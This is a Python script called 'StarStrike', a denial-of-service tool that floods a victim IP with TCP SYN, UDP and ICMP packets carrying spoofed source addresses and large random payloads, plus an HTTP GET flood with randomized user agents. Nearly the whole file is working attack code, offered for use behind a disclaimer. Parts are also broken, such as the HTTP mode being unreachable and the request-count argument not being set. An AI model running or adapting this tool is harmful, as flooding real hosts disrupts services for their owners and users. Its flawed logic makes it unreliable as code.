##############################################################
#          _____ __             _____ __     _ __            #
#         / ___// /_____ ______/ ___// /____ (_) /_____      #
#        \__ \/ __/ __ `/ ___/\__ \/ __/ __/ / //_/ _ \      #
#        ___/ / /_/ /_/ / /   ___/ / /_/ /_/ / ,< /  __/     #
#       /____/\__/\__,_/_/   /____/\__/\__/_/_/|_|\___/      #
#                                                            #
##############################################################
#                       !WARNING!                            #
#                                                            #
#    Malicious use of this tool without permission is        #
#      illegal and may result in imprisonment.               #
#   Only use this tool with permission from the victim.      #
#   The creator of this tool will not take accountability    #
#     for the damages it may do, as it is the user's fault.  #
#                                                            #
#        This tool is not associated with NetStrike.         #
##############################################################
#                      made by solez                         #
##############################################################

#the glorious banner was made by mikes

import sys
import random
import os
from time import sleep
import threading
from scapy.all import send, IP, TCP, UDP, Raw, ICMP
from aiohttp import TCPConnector, ClientTimeout, ClientSession, ClientError
import asyncio
from fake_useragent import UserAgent

def print_banner():
    print(r'''
#          _____ __             _____ __     _ __            #
#         / ___// /_____ ______/ ___// /____ (_) /_____      #
#        \__ \/ __/ __ `/ ___/\__ \/ __/ __/ / //_/ _ \      #
#        ___/ / /_/ /_/ / /   ___/ / /_/ /  / ,< /  __/      #
#       /____/\__/\__,_/_/   /____/\__/\/ _/_/|_|\___/       #
#                                                            #
''')

tsize = 0 #total bytes sent
types = ["tcp", "udp", "icmp"] # types of attack
athreads = [] # contains all current threads
ros = 0

#-- defaults --#
threads=10
doprint=True
payload_size=65455
typea="tcp" # the type of attack
dest_ip="127.0.0.1"
lock_port=True
port=3703
dest_url = "about:blank"
n_requests = 1000

#validate ip
def validate_ip(ip):
    if len(ip.split('.')) == 4: return True
    return False

#-- arg handling --#
if len(sys.argv) > 1:
    for arg in sys.argv:
        # set threads
        if arg.startswith("--threads"):
            threads = int(arg.removeprefix("--threads"))
        # no printing
        if arg == "--noprint":
            doprint=False
        # set the size of each payload (in bytes)
        if arg.startswith("--payloadsize"):
            payload_size = int(arg.removeprefix("--payloadsize"))
        # set the type
        if arg.startswith("--type"):
            typea = arg.removeprefix("--type")
            if not typea in types: exit(f"{typea} as an attack type doesnt exist!")
        # the victims ip
        if arg.startswith("--victimip"):
            dest_ip = arg.removeprefix("--victimip")
            if not validate_ip(dest_ip): exit("Invalid IP!")
        # the victims url for http flood
        if arg.startswith("--victimurl"):
            dest_url = arg.removeprefix("--victimurl")
        # unlock port randomization
        if arg == "--unlockport":
            lock_port = False
        # set port
        if arg.startswith("--setport"):
            port = int(arg.removeprefix("--setport"))
            if not port>10000: exit(f"Port {port} is invalid!")
        # set number of requests for http flood
        if arg.startswith("--rqn"):
            n_requests == int(arg.removeprefix("--rqn"))
else: exit("Check the code to see how you configure it, or just do python starstrike.py --victimip[target ip]")

#stop event
stop = threading.Event()

#-- attack types --#

#do a tcp syn flood attack
def tcp_flood(thread):
    global tsize
    global port
    while not stop.is_set():
        if not lock_port: port = random.randint(0, 9999) #if lock_port is False, generate a random port (idk why i added this)
        payload = os.urandom(payload_size) #create a payload with random contents
        source = f"{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}" #generate a random source ip
        packet = IP(src = source, dst = dest_ip) / TCP(dport = port, flags = 'S') / Raw(load = payload) #create a packet with a spoofed ip
        try:send(packet, verbose=False) #send the packet
        except Exception as e: print(e)
        tsize += payload_size #dawg im not putting these comments in every attack function
        if doprint: print(f"[TCP SYN] PAYLOAD {payload_size} TO {dest_ip} THREAD {thread}") #LarpStrike
        sleep(0)

#do a icmp flood attack
def icmp_flood(thread):
    global tsize
    while not stop.is_set():
        if not lock_port: port = random.randint(0, 9999)
        payload = os.urandom(payload_size)
        source = f"{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
        packet = IP(src = source, dst = dest_ip) / ICMP() / Raw(load = payload)
        send(packet, verbose=False)
        tsize += payload_size
        if doprint: print(f"[ICMP] PAYLOAD {payload_size} TO {dest_ip} THREAD {thread}")
        sleep(0)

#do a udp flood attack
def udp_flood(thread):
    global tsize
    global port
    while not stop.is_set():
        if not lock_port: port = random.randint(0, 9999)
        payload = os.urandom(payload_size)
        source = f"{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
        packet = IP(src = source, dst = dest_ip) / UDP(dport=port) / Raw(load = payload)
        try: send(packet, verbose=False)
        except Exception as e: print(e)
        tsize += payload_size
        if doprint: print(f"[UDP] PAYLOAD {payload_size} TO {dest_ip} THREAD {thread}")
        sleep(0)

#send request, used for http flood
async def send_req(session, thread):
    global tsize
    try:
        # fake headers to make the request more legit
        headers = {
            "User-Agent": UserAgent().random,
            "Connection": "keep-alive",
            "Accept": "*/*"
        }
        #disable ssl verif
        async with session.get(dest_url, headers = headers, ssl = False ) as response:
            tsize +=1
            print(f"[HTTP] GET REQUEST SENT TO {dest_url} STATUS: {response.status} THREAD {thread}")
    except TimeoutError:
        print("[HTTP] timed out, trying again...")
    except ClientError as e:
        print(f"[HTTP] client error \n{e}")

#http flood attack
async def http_flood(n_req, thread):
    connection = TCPConnector()
    timeout = ClientTimeout(total=10)
    async with ClientSession(connector = connection, timeout = timeout) as session:
        tasks = [send_req(session, thread) for _ in range(n_req)]
        responses = await(asyncio.gather(*tasks))
        (response for response in responses)


#-- helpers --#
def stopv():
    global stop
    stop.set()
    print("Stopping StarStrike...")
    for thread in athreads:
        thread.join()
    print(f"total sent (in megabytes): {tsize/1024/1024}")

def attack(thread):
    match typea:
        case "tcp": tcp_flood(thread)
        case "udp": udp_flood(thread)
        case "icmp": icmp_flood(thread)
        case "http": http_flood()

#-- MAIN --#
def main():
    print_banner()
    print("created by solez, for NETWORK0 group\n")
    # HelloWorld("print")
    tcount = threads
    while not len(athreads) == threads:
        t = threading.Thread(target=attack, args=(tcount,))
        athreads.append(t)
        tcount -=1
    for thread in athreads: thread.start()
    try: 
        while True: sleep(0)
    except KeyboardInterrupt: stopv()

if __name__ == "__main__":
    main()

